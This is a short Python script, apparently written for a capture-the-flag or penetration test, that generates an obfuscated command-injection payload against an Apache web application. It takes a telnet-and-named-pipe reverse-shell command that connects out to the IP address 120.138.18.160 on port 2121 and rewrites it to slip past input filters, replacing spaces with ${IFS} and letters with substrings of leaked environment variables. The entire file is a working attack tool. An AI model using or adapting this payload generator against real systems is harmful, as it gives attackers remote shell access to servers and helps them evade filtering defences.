import sys

env = """
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
JOURNAL_STREAM=9:1404127949
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
INVOCATION_ID=a0bda8294b7c4c6d8a9bb6b1c0b62d10
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/var/www/html/webapps/familytree
"""
d = {}

for s in env.splitlines():
        tmp = s.split("=")
        if len(tmp) > 1:
                d[tmp[0]]=tmp[1]

cmd = "; TF=$(mktemp -u);mkfifo $TF && telnet 120.138.18.160 2121 0<$TF | sh 1>$TF;"
final_cmd = ''

for c in cmd:
        # check if it's space
        if c == ' ':
                final_cmd += "${IFS}"
        # check if ascii
        elif c.isupper():
                final_cmd +=c
        elif c.isalpha():
                found = False
                # check if it's in the ENV
                for k in d:
                        if c in d[k]:
                                ind = d[k].index(c)
                                final_cmd += "${"+k+":"+str(ind)+":1}"
                                found = True
                                break
                if not found:
                        print("Can't find char: " + repr(c))
                        sys.exit()
        else:
                final_cmd += c



print("Final payload: " + final_cmd)